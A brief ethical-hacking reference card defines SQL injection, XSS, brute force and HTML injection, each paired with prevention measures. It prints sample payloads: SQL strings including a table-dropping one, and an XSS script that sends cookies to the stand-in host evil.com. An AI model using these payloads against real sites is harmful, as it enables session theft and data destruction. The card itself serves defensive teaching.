Attack Definitions
EHPT Reference Guide
💉 SQL Injection
Attacker inserts malicious SQL into input fields to manipulate database queries. Can bypass authentication, extract all data, or destroy records.
Payload: ' OR '1'='1 / admin'-- / '; DROP TABLE users;--
📜 Cross-Site Scripting (XSS)
Malicious scripts injected into web pages execute in other users' browsers. Enables session hijacking, cookie theft, and credential stealing.
<script>document.location='evil.com?c='+document.cookie</script>
🔑 Brute Force Attack
Automated tool tries thousands of username/password combinations. Exploits lack of rate limiting, CAPTCHA, or account lockout policies.
Tool: Hydra / Burp Intruder — 1000 requests/min with no lockout
🖊️ HTML Injection
Attacker injects raw HTML tags into input fields. Can deface pages, create fake login forms, redirect users, or display misleading content.
Payload: <h1>Hacked</h1> / <marquee>Injected</marquee> / <b>Bold</b>
Prevention Methods
✓ SQL Injection Prevention
• Use parameterized queries / prepared statements
• Input validation and whitelist filtering
• Principle of least privilege on DB accounts
• WAF rules to block SQL metacharacters
• Use ORM (SQLAlchemy / Django ORM)
✓ XSS Prevention
• HTML encode all user-supplied output
• Content Security Policy (CSP) headers
• HttpOnly and Secure cookie flags
• Use Jinja2 auto-escaping (Flask default)
• DOMPurify for client-side sanitization
✓ Brute Force Prevention
• Rate limiting: max 5 attempts per 15 minutes
• CAPTCHA after 3 failed attempts
• Account lockout with exponential backoff
• Multi-Factor Authentication (MFA/OTP)
• Login anomaly alerting
✓ HTML Injection Prevention
• Escape all HTML special characters on output
• Use Jinja2 auto-escaping (avoid |safe filter)
• Strip HTML tags using bleach library
• Validate and sanitize all user inputs
• Implement Content Security Policy headers
